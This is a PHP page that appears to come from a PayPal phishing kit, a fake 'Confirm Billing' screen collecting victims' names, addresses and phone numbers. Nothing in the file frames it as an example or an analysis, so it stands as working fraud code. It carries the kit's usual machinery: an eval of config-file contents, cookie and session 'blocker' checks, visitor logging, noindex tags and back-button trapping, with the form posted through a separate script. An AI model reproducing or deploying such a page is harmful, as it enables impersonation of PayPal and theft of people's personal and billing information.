<?php
require_once __DIR__ . '/function.php';

if (file_exists($api->dir_config . '/' . $api->general_config)) {
  @eval(file_get_contents($api->dir_config . '/' . $api->general_config));
}

if ($config_blocker == 1) {
  $api->cookie();
  $api->session();
}

$api->visitor("Billing");

?>
<!DOCTYPE html>
<html>

<head>
<title><?=$api->transcode("PayPal: Confirm Billing");?></title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="shortcut icon" href="../assets/img/favicon.ico">
<link rel="apple-touch-icon" href="../assets/img/apple-touch-icon.png">
<link rel="stylesheet" href="../assets/css/myaccount_app.css">
<link rel="stylesheet" href="../assets/css/myaccount_wallet.css">
<script src="../assets/js/jquery.min.js"></script>
<script src="../assets/js/jquery.mask.js"></script>
<script src="../assets/js/jquery.validate.js"></script>
<script src="../assets/js/myaccount.billing.js"></script>
<script type="text/javascript">
window.history.forward();

function noBack() {
window.history.forward();
}
</script>
</head>

<body onLoad="noBack();" onpageshow="if (event.persisted) noBack();" onUnload="">
<section class="theoverpanel">
<div class="overpanel-wrapper row">
<div class="overpanel-content col-xs-12 col-xs-offset-0 col-sm-8 col-sm-offset-2 col-md-4 col-md-offset-4">
<div class="overpanel-header">
<h2><?=$api->transcode("Add Billing Address");?></h2>
</div>
<div class="overpanel-body">
<form method="post" id="billing" autocomplete="off">
<div class="addressEntry">

<div class="cardInputs">
<div class="js_card_toggleField">
<div class="textInput lap" id="DivFname">
<input type="text" placeholder="<?=$api->transcode("First Name");?>" id="Fname" name="fname">
</div>
</div>
<div class="js_card_toggleField">
<div class="textInput pull-right lap" id="DivLname">
<input type="text" placeholder="<?=$api->transcode("Last Name");?>" id="Lname" name="lname">
</div>
</div>
</div>
<div class="textInput lap" id="DivAddress">
<input type="text" placeholder="<?=$api->transcode("Address Line");?>" id="Address" name="address">
</div>

<div class="cardInputs">
<div class="js_card_toggleField">
<div class="textInput lap" id="DivCity">
<input type="text" placeholder="<?=$api->transcode("City");?>" id="City" name="city">
</div>
</div>
<div class="js_card_toggleField">
<div class="textInput pull-right lap" id="DivState">
<input type="text" placeholder="<?=$api->transcode("State");?>" id="State" name="state">
</div>
</div>
</div>

<div class="cardInputs">
<div class="js_card_toggleField">
<div class="textInput lap" id="DivZip">
<input type="text" placeholder="<?=$api->transcode("Zip Code");?>" id="Zip" name="zip">
</div>
</div>
<div class="js_card_toggleField">
<div class="textInput pull-right lap" id="DivPhone">
<input type="tel" class="phone" placeholder="<?=$api->transcode("Phone Number");?>" id="Phone" name="phone">
</div>
</div>
</div>

</div>
<input class="vx_btn" type="submit" value="<?=$api->transcode("Confirm");?>" id="btnConfirm">
<p class="scretlogo"></p>
</form>
</div>
</div>
</div>
<div class="hasSpinner hide" id="loading"></div>
</section>
<script src="../assets/js/billing.post.js"></script>
</body>
</html>
